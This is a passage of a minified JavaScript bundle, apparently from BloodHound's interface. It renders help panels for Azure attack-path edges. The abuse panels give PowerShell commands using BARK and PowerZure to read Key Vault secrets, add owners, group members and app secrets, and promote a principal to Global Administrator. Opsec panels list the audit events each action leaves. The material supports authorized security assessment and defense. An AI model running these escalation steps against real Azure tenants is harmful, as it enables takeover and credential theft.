PowerZure"}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurekeyvaultcontent",children:"Get-AzureKeyVaultContent"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#export-azurekeyvaultcontent",children:"Export-AzureKeyVaultcontent"})]}),Fr=()=>e.jsx(t,{variant:"body2",children:"Azure will create a new log event for the key vault whenever a secret is accessed."}),Ur=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://blog.netspi.com/azure-automation-accounts-key-stores/",children:"https://blog.netspi.com/azure-automation-accounts-key-stores/"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurekeyvaultcontent",children:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurekeyvaultcontent"})]}),_r={general:Gr,abuse:Er,opsec:Fr,references:Ur},Lr=()=>e.jsx(t,{variant:"body2",children:"The ability to read keys from key vaults"}),Wr=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Use PowerShell or PowerZure to fetch the key from the key vault"}),e.jsx(t,{variant:"body2",children:"Via PowerZure"}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#export-azurekeyvaultcontent",children:"Export-AzureKeyVaultContent"})]}),zr=()=>e.jsx(t,{variant:"body2",children:"Azure will create a new log event for the key vault whenever a secret is accessed."}),Br=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://blog.netspi.com/azure-automation-accounts-key-stores/",children:"https://blog.netspi.com/azure-automation-accounts-key-stores/"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#export-azurekeyvaultcontent",children:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#export-azurekeyvaultcontent"})]}),Nr={general:Lr,abuse:Wr,opsec:zr,references:Br},Vr=()=>e.jsx(t,{variant:"body2",children:"The ability to read secrets from key vaults"}),Kr=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Use PowerShell or PowerZure to fetch the secret from the key vault"}),e.jsx(t,{variant:"body2",children:"Via PowerZure"}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurekeyvaultcontent",children:"Get-AzureKeyVaultContent"})]}),Hr=()=>e.jsx(t,{variant:"body2",children:"Azure will create a new log event for the key vault whenever a secret is accessed."}),qr=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://blog.netspi.com/azure-automation-accounts-key-stores/",children:"https://blog.netspi.com/azure-automation-accounts-key-stores/"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurekeyvaultcontent",children:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurekeyvaultcontent"})]}),Yr={general:Vr,abuse:Kr,opsec:Hr,references:qr},Jr=()=>e.jsx(t,{variant:"body2",children:"This edge indicates the principal has the Global Admin role active against the target tenant. In other words, the principal is a Global Admin. Global Admins can do almost anything against almost every object type in the tenant, this is the highest privilege role in Azure."}),Xr=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"As a Global Admin, you can change passwords, run commands on VMs, read key vault secrets, activate roles for other users, etc."}),e.jsx(t,{variant:"body2",children:"Via PowerZure"}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html",children:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html"}),e.jsx(t,{variant:"body2",children:"For Global Admin to be able to abuse Azure resources, you must first grant yourself the 'User Access Administrator' role in Azure RBAC. This is done through a toggle button in the portal, or via the PowerZure function Set-AzureElevatedPrivileges."}),e.jsx(t,{variant:"body2",children:"Once that role is applied to account, you can then add yourself as an Owner to all subscriptions in the tenant"})]}),Qr=()=>e.jsx(t,{variant:"body2",children:"This depends on exactly what you do, but in general Azure will log each abuse action."}),Zr=()=>e.jsx(h,{sx:{overflowX:"auto"},children:e.jsx(o,{target:"_blank",rel:"noopener",href:"https://blog.netspi.com/attacking-azure-cloud-shell/",children:"https://blog.netspi.com/attacking-azure-cloud-shell/"})}),eo={general:Jr,abuse:Xr,opsec:Qr,references:Zr},to=()=>e.jsx(t,{variant:"body2",children:"This edge indicates that a principal has been granted a particular AzureAD admin role."}),no=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"No abuse is necessary. This edge only indicates that the principal has been granted a particular AzureAD admin role."})}),ro=()=>e.jsx(t,{variant:"body2",children:"The opsec considerations for a particular action authorized by a principal“s active AzureAD role assignment will wholly depend on what the action taken is. This edge does not capture all abusable possibilities."}),oo=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://docs.microsoft.com/en-us/graph/permissions-reference",children:"Microsoft Graph Permission Reference"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://docs.microsoft.com/en-us/azure/role-based-access-control/overview",children:"Azure role-based access control"})]}),ao={general:to,abuse:no,opsec:ro,references:oo},so=()=>e.jsx(t,{variant:"body2",children:"The Key Vault Contributor role grants full control of the target Key Vault. This includes the ability to read all secrets stored on the Key Vault."}),io=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"You can read secrets and alter access policies (grant yourself access to read secrets)"}),e.jsx(t,{variant:"body2",children:"Via PowerZure:"}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurekeyvaultcontent",children:"Get-AzureKeyVaultContent"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#export-azurekeyvaultcontent",children:"Export-AzureKeyVaultContent"})]}),co=()=>e.jsx(t,{variant:"body2",children:"This will depend on which particular abuse you perform, but in general Azure will create a log event for each abuse."}),lo=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsxs(o,{target:"_blank",rel:"noopener",href:"https://blog.netspi.com/maintaining-azure-persistence-via-automation-accounts/ ",children:["https://blog.netspi.com/maintaining-azure-persistence-via-automation-accounts/"," "]}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://blog.netspi.com/azure-automation-accounts-key-stores/",children:"https://blog.netspi.com/azure-automation-accounts-key-stores/"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://blog.netspi.com/get-azurepasswords/",children:"https://blog.netspi.com/get-azurepasswords/"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://blog.netspi.com/attacking-azure-cloud-shell/",children:"https://blog.netspi.com/attacking-azure-cloud-shell/"})]}),ho={general:so,abuse:io,opsec:co,references:lo},po=()=>e.jsx(t,{variant:"body2",children:"The Logic Contributor role grants full control of the target Logic App. This includes the ability to execute arbitrary commands on the Logic App."}),uo=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Currently you need access to the portal GUI to execute this abuse."}),e.jsx(t,{variant:"body2",children:"The abuse involves adding or modifying an existing logic app to coerce the logic app into sending a JWT for its managed identity service principal to a web server you control."}),e.jsx(t,{variant:"body2",children:"You can see a full walkthrough for executing that abuse in this blog post:"}),e.jsx(t,{variant:"body2",children:e.jsx(o,{target:"_blank",rel:"noopener",href:"https://medium.com/p/52b29354fc54",children:"Andy Robbins - Managed Identity Attack Paths, Part 2: Logic Apps"})})]}),mo=()=>e.jsx(t,{variant:"body2",children:"This will depend on which particular abuse you perform, but in general Azure will create a log event for each abuse."}),bo=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/BloodHoundAD/BARK",children:"Andy Robbins - BARK.ps1"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://medium.com/p/52b29354fc54",children:"Managed Identity Attack Paths, Part 2: Logic Apps"})]}),go={general:po,abuse:uo,opsec:mo,references:bo},yo=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"This edge is created during post-processing. It is created against non role assignable Azure AD security groups when a Service Principal has one of the following MS Graph app role assignments:"}),e.jsxs(z,{children:[e.jsx(y,{children:e.jsx(f,{children:"Directory.ReadWrite.All"})}),e.jsx(y,{children:e.jsx(f,{children:"Group.ReadWrite.All"})}),e.jsx(y,{children:e.jsx(f,{children:"GroupMember.ReadWrite.All"})})]}),e.jsx(t,{variant:"body2",children:"It is created against all Azure AD security groups, including those that are role assignable, when a Service Principal has the following MS Graph app role:"}),e.jsx(z,{children:e.jsx(y,{children:e.jsx(f,{children:"RoleManagement.ReadWrite.Directory"})})}),e.jsx(t,{variant:"body2",children:"You will not see this privilege when using just the Azure portal or any other Microsoft tooling. If you audit the roles and administrators affecting any particular Azure security group, you will not see that the Service Principal can add members to the group, but it indeed can because of the parallel access management system used by MS Graph."})]}),fo=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"You can abuse this privilege using BARK's Add-AZMemberToGroup function."}),e.jsx(t,{variant:"body2",children:"This function requires you to supply an MS Graph-scoped JWT associated with the Service Principal that has the privilege to add principal to the target group. There are several ways to acquire a JWT. For example, you may use BARK’s Get-MSGraphTokenWithClientCredentials to acquire an MS Graph-scoped JWT by supplying a Service Principal Client ID and secret:"}),e.jsx(t,{component:"pre",children:'$MGToken = Get-MSGraphTokenWithClientCredentials `\n    -ClientID "34c7f844-b6d7-47f3-b1b8-720e0ecba49c" `\n    -ClientSecret "asdf..." `\n    -TenantName "contoso.onmicrosoft.com"'}),e.jsx(t,{variant:"body2",children:"Then use BARK’s Add-AZMemberToGroup function to add a new principial to the target group:"}),e.jsx(t,{component:"pre",children:'Add-AZMemberToGroup `\n    -PrincipalID = "028362ca-90ae-41f2-ae9f-1a678cc17391" `\n    -TargetGroupId "b9801b7a-fcec-44e2-a21b-86cb7ec718e4" `\n    -Token $MGToken.access_token'}),e.jsx(t,{variant:"body2",children:"Now you can re-authenticate as the principial you just added to the group and continue your attack path, now having whatever privileges the target group has."})]}),wo=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"The Azure activity log for the tenant will log who added what principal to what group, including the date and time."})}),xo=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/techniques/T1098/",children:"ATT&CK T1098: Account Manipulation"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5",children:"Andy Robbins - Azure Privilege Escalation via Service Principal Abuse"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/BloodHoundAD/BARK",children:"Andy Robbins - BARK.ps1"})]}),jo={general:yo,abuse:fo,opsec:wo,references:xo},vo=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"This edge is created during post-processing. It is created against all App Registrations and Service Principals within the same tenant when a Service Principal has the following MS Graph app role:"}),e.jsx(t,{variant:"body2",children:e.jsx(z,{children:e.jsx(y,{children:e.jsx(f,{children:"Application.ReadWrite.All"})})})}),e.jsx(t,{variant:"body2",children:"It is also created against all Azure Service Principals when a Service Principal has the following MS Graph app role:"}),e.jsx(t,{variant:"body2",children:e.jsx(z,{children:e.jsx(y,{children:e.jsx(f,{children:"ServicePrincipalEndpoint.ReadWrite.All"})})})}),e.jsx(t,{variant:"body2",children:"It is also created against all Azure security groups that are not role eligible when a Service Principal has one of the following MS Graph app roles:"}),e.jsx(t,{variant:"body2",children:e.jsxs(z,{children:[e.jsx(y,{children:e.jsx(f,{children:"Directory.ReadWrite.All"})}),e.jsx(y,{children:e.jsx(f,{children:"Group.ReadWrite.All"})})]})}),e.jsx(t,{variant:"body2",children:"Finally, it is created against all Azure security groups and all Azure App Registrations when a Service Principal has the following MS Graph app role:"}),e.jsx(t,{variant:"body2",children:e.jsx(z,{children:e.jsx(y,{children:e.jsx(f,{children:"RoleManagement.ReadWrite.Directory"})})})}),e.jsx(t,{variant:"body2",children:"You will not see these privileges when auditing permissions against any of the mentioned objects when you use Microsoft tooling, including the Azure portal and the MS Graph API itself."})]}),Ao=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"You can use BARK to add a new owner to the target object. The BARK function you use will depend on the target object type, but all of the functions follow a similar syntax."}),e.jsx(t,{variant:"body2",children:"These functions require you to supply an MS Graph-scoped JWT associated with the Service Principal that has the privilege to add a new owner to the target object. There are several ways to acquire a JWT. For example, you may use BARK’s Get-MSGraphTokenWithClientCredentials to acquire an MS Graph-scoped JWT by supplying a Service Principal Client ID and secret:"}),e.jsx(t,{component:"pre",children:'$MGToken = Get-MSGraphTokenWithClientCredentials `\n    -ClientID "34c7f844-b6d7-47f3-b1b8-720e0ecba49c" `\n    -ClientSecret "asdf..." `\n    -TenantName "contoso.onmicrosoft.com"'}),e.jsx(t,{variant:"body2",children:"To add a new owner to a Service Principal, use BARK's New-ServicePrincipalOwner function:"}),e.jsx(t,{component:"pre",children:'New-ServicePrincipalOwner `\n    -ServicePrincipalObjectId "082cf9b3-24e2-427b-bcde-88ffdccb5fad" `\n    -NewOwnerObjectId "cea271c4-7b01-4f57-932d-99d752bbbc60" `\n    -Token $Token'}),e.jsx(t,{variant:"body2",children:"To add a new owner to an App Registration, use BARK's New-AppOwner function:"}),e.jsx(t,{component:"pre",children:'New-AppOwner `\n    -AppObjectId "52114a0d-fa5b-4ee5-9a29-2ba048d46eee" `\n    -NewOwnerObjectId "cea271c4-7b01-4f57-932d-99d752bbbc60" `\n    -Token $Token'}),e.jsx(t,{variant:"body2",children:"To add a new owner to a Group, use BARK's New-GroupOwner function:"}),e.jsx(t,{component:"pre",children:'New-AppOwner `\n    -GroupObjectId "352032bf-161d-4788-b77c-b6f935339770" `\n    -NewOwnerObjectId "cea271c4-7b01-4f57-932d-99d752bbbc60" `\n    -Token $Token'})]}),So=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"Any time you add an owner to any Azure object, the AzureAD audit logs will create an event logging who added an owner to what object, as well as what the new owner added to the object was."})}),ko=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/techniques/T1098/",children:"ATT&CK T1098: Account Manipulation"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5",children:"Andy Robbins - Azure Privilege Escalation via Service Principal Abuse"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/BloodHoundAD/BARK",children:"Andy Robbins - BARK.ps1"})]}),To={general:vo,abuse:Ao,opsec:So,references:ko},Po=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"This edge is created during post-processing. It is created against all Azure App Registrations and Service Principals when a Service Principal has one of the following MS Graph app roles:"}),e.jsx(t,{variant:"body2",children:e.jsxs(z,{children:[e.jsx(y,{children:e.jsx(f,{children:"Application.ReadWrite.All"})}),e.jsx(y,{children:e.jsx(f,{children:"RoleManagement.ReadWrite.Directory"})})]})}),e.jsx(t,{variant:"body2",children:"You will not see this privilege when using just the Azure portal or any other Microsoft tooling. If you audit the roles and administrators affecting any particular Azure App or Service Principal, you will not see that the Service Principal can add secrets to the object, but it indeed can because of the parallel access management system used by MS Graph."})]}),Co=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"There are several ways to perform this abuse, depending on what sort of access you have to the credentials of the object that holds this privilege against the target object. If you have an interactive web browser session for the Azure portal, it is as simple as finding the target App in the portal and adding a new secret to the object using the “Certificates & secrets” tab. Service Principals do not have this tab in the Azure portal but you can add secrets to them with the MS Graph API."}),e.jsx(t,{variant:"body2",children:"No matter what kind of control you have, you will be able to perform this abuse by using BARK’s New-AppRegSecret or New-ServicePrincipalSecret functions."}),e.jsx(t,{variant:"body2",children:"These functions require you to supply an MS Graph-scoped JWT associated with the Service Principal that has the privilege to add secrets to the target object. There are several ways to acquire a JWT. For example, you may use BARK’s Get-MSGraphTokenWithClientCredentials to acquire an MS Graph-scoped JWT by supplying a Service Principal Client ID and secret:"}),e.jsx(t,{component:"pre",children:`$MGToken = Get-MSGraphTokenWithClientCredentials
    -ClientID "34c7f844-b6d7-47f3-b1b8-720e0ecba49c"
    -ClientSecret "asdf..."
    -TenantName "contoso.onmicrosoft.com"`}),e.jsx(t,{variant:"body2",children:"Then use BARK’s New-AppRegSecret to add a new secret to the target application:"}),e.jsx(t,{component:"pre",children:'New-AppRegSecret `\n    -AppRegObjectID "d878…" `\n    -Token $MGToken.access_token'}),e.jsx(t,{variant:"body2",children:"The output will contain the plain-text secret you just created for the target app:"}),e.jsx(t,{component:"pre",children:`New-AppRegSecret \`
-AppRegObjectID "d878…" \`
-Token $MGToken.access_token

Name                Value
-----------------------------
AppRegSecretValue   odg8Q~...
AppRegAppId         4d31…
AppRegObjectId      d878…`}),e.jsx(t,{variant:"body2",children:"With this plain text secret, you can now acquire tokens as the service principal associated with the app. You can easily do this with BARK’s Get-MSGraphToken function:"}),e.jsx(t,{component:"pre",children:'$SPToken = Get-MSGraphToken `\n    -ClientID "4d31…" `\n    -ClientSecret "odg8Q~..." `\n    -TenantName "contoso.onmicrosoft.com"'}),e.jsx(t,{variant:"body2",children:"Now you can use this JWT to perform actions against any other MS Graph endpoint as the service principal, continuing your attack path with the privileges of that service principal."})]}),Do=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"When you create a new secret for an App or Service Principal, Azure creates an event called “Update application – Certificates and secrets management”. This event describes who added the secret to which application or service principal."})}),Ro=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/techniques/T1098/",children:"ATT&CK T1098: Account Manipulation"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5",children:"Andy Robbins - Azure Privilege Escalation via Service Principal Abuse"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/BloodHoundAD/BARK",children:"Andy Robbins - BARK.ps1"})]}),Oo={general:Po,abuse:Co,opsec:Do,references:Ro},$o=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"This edge is created when a Service Principal has been granted the AppRoleAssignment.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),Io=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"This edge is created when a Service Principal has been granted the AppRoleAssignment.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),Mo=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"This edge is created when a Service Principal has been granted the AppRoleAssignment.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),Go=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/techniques/T1098/",children:"ATT&CK T1098: Account Manipulation"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5",children:"Andy Robbins - Azure Privilege Escalation via Service Principal Abuse"})]}),Eo={general:$o,abuse:Io,opsec:Mo,references:Go},Fo=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"This edge is created when a Service Principal has been granted the Application.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),Uo=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"This edge is created when a Service Principal has been granted the Application.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),_o=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"This edge is created when a Service Principal has been granted the Application.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),Lo=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/techniques/T1098/",children:"ATT&CK T1098: Account Manipulation"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5",children:"Andy Robbins - Azure Privilege Escalation via Service Principal Abuse"})]}),Wo={general:Fo,abuse:Uo,opsec:_o,references:Lo},zo=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"This edge is created when a Service Principal has been granted the Directory.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),Bo=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"This edge is created when a Service Principal has been granted the Directory.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),No=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"This edge is created when a Service Principal has been granted the Directory.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),Vo=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/techniques/T1098/",children:"ATT&CK T1098: Account Manipulation"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5",children:"Andy Robbins - Azure Privilege Escalation via Service Principal Abuse"})]}),Ko={general:zo,abuse:Bo,opsec:No,references:Vo},Ho=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"This edge is created during post-processing. It is created against AzureAD tenant objects when a Service Principal has one of the following MS Graph app role assignments:"}),e.jsx(t,{variant:"body2",children:e.jsxs(z,{children:[e.jsx(y,{children:e.jsx(f,{children:"AppRoleAssignment.ReadWrite.All"})}),e.jsx(y,{children:e.jsx(f,{children:"RoleManagement.ReadWrite.Directory"})})]})})]}),qo=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"With the ability to grant arbitrary app roles, you can grant the RoleManagement.ReadWrite.Directory app role to a Service Principal you already control, and then promote it or another principal to Global Administrator."}),e.jsx(t,{variant:"body2",children:"These functions require you to supply an MS Graph-scoped JWT associated with the Service Principal that has the privilege to grant app roles. There are several ways to acquire a JWT. For example, you may use BARK’s Get-MSGraphTokenWithClientCredentials to acquire an MS Graph-scoped JWT by supplying a Service Principal Client ID and secret:"}),e.jsx(t,{component:"pre",children:'$MGToken = Get-MSGraphTokenWithClientCredentials `\n    -ClientID "34c7f844-b6d7-47f3-b1b8-720e0ecba49c" `\n    -ClientSecret "asdf..." `\n    -TenantName "contoso.onmicrosoft.com"'}),e.jsx(t,{variant:"body2",children:"Use BARK's Get-AllAzureADServicePrincipals to collect all Service Principal objects in the tenant:"}),e.jsx(t,{component:"pre",children:'"$SPs = Get-AllAzureADServicePrincipals `\n    -Token $MGToken"'}),e.jsx(t,{variant:"body2",children:"Next, find the MS Graph Service Principal's ID. You can do this by piping $SPs to Where-Object, finding objects where the appId value matches the universal ID for the MS Graph Service Principal, which is 00000003-0000-0000-c000-000000000000:"}),e.jsx(t,{component:"pre",children:'$SPs | ?{$_.appId -Like "00000003-0000-0000-c000-000000000000"} | Select id'}),e.jsx(t,{variant:"body2",children:`The output will be the object ID of the MS Graph Service Principal. Take that ID and use it as the "ResourceID" argument for BARK's New-AppRoleAssignment function. The AppRoleID of '9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8' is the universal ID for RoleManagement.ReadWrite.Directory. The SPObjectId is the object ID of the Service Principal you want to grant this app role to:`}),e.jsx(t,{component:"pre",children:`'New-AppRoleAssignment \`
    -SPObjectId "6b6f9289-fe92-4930-a331-9575e0a4c1d8" \`
    -AppRoleID "9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8" \`
    -ResourceID "9858020a-4c00-4399-9ae4-e7897a8333fa" \`
    -Token $MGToken'`}),e.jsx(t,{variant:"body2",children:"If successful, the output of this command will show you the App Role assignment ID. Now that your Service Principal has the RoleManagement.ReadWrite.Directory MS Graph app role, you can promote the Service Principal to Global Administrator using BARK's New-AzureADRoleAssignment."}),e.jsx(t,{component:"pre",children:'New-AzureADRoleAssignment `\n    -PrincipalID "6b6f9289-fe92-4930-a331-9575e0a4c1d8" `\n    -RoleDefinitionId "62e90394-69f5-4237-9190-012177145e10" `\n    -Token $MGToken'}),e.jsx(t,{variant:"body2",children:"If successful, the output will include the principal ID, the role ID, and a unique ID for the role assignment."})]}),Yo=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:'When you assign an app role to a Service Principal, the Azure Audit logs will create an event called "Add app role assignment to service principal". This event describes who made the change, what the target service principal was, and what app role assignment was granted.'})}),Jo=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/techniques/T1098/",children:"ATT&CK T1098: Account Manipulation"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5",children:"Andy Robbins - Azure Privilege Escalation via Service Principal Abuse"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/BloodHoundAD/BARK",children:"Andy Robbins - BARK.ps1"})]}),Xo={general:Ho,abuse:qo,opsec:Yo,references:Jo},Qo=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"This edge is created during post-processing. It is created against all AzureAD admin roles when a Service Principal has the following MS Graph app role assignment:"}),e.jsx(t,{variant:"body2",children:e.jsx(z,{children:e.jsx(y,{children:e.jsx(f,{children:"RoleManagement.ReadWrite.Directory"})})})}),e.jsx(t,{variant:"body2",children:"This privilege allows the Service Principal to promote itself or any other principal to any AzureAD admin role, including Global Administrator."})]}),Zo=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To abuse this privilege, you can promote a principal you control to Global Administrator using BARK's New-AzureADRoleAssignment."}),e.jsx(t,{variant:"body2",children:"This function requires you to supply an MS Graph-scoped JWT associated with the Service Principal that has the privilege to grant AzureAD admin roles. There are several ways to acquire a JWT. For example, you may use BARK’s Get-MSGraphTokenWithClientCredentials to acquire an MS Graph-scoped JWT by supplying a Service Principal Client ID and secret:"}),e.jsx(t,{component:"pre",children:'$MGToken = Get-MSGraphTokenWithClientCredentials `\n    -ClientID "34c7f844-b6d7-47f3-b1b8-720e0ecba49c" `\n    -ClientSecret "asdf..." `\n    -TenantName "contoso.onmicrosoft.com"'}),e.jsx(t,{variant:"body2",children:"Then use BARK's New-AzureADRoleAssignment function to grant the AzureAD role to your target principal:"}),e.jsx(t,{component:"pre",children:'New-AzureADRoleAssignment `\n    -PrincipalID "6b6f9289-fe92-4930-a331-9575e0a4c1d8" `\n    -RoleDefinitionId "62e90394-69f5-4237-9190-012177145e10" `\n    -Token $MGToken'}),e.jsx(t,{variant:"body2",children:"If successful, the output will include the principal ID, the role ID, and a unique ID for the role assignment."})]}),ea=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:'When you assign an AzureAD admin role to a principal using this privilege, the Azure Audit log will create an event called "Add member to role outside of PIM (permanent)".'})}),ta=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/techniques/T1098/",children:"ATT&CK T1098: Account Manipulation"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5",children:"Andy Robbins - Azure Privilege Escalation via Service Principal Abuse"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/BloodHoundAD/BARK",children:"Andy Robbins - BARK.ps1"})]}),na={general:Qo,abuse:Zo,opsec:ea,references:ta},ra=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"This edge is created when a Service Principal has been granted the GroupMember.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),oa=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"This edge is created when a Service Principal has been granted the GroupMember.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),aa=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"This edge is created when a Service Principal has been granted the GroupMember.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),sa=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/techniques/T1098/",children:"ATT&CK T1098: Account Manipulation"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5",children:"Andy Robbins - Azure Privilege Escalation via Service Principal 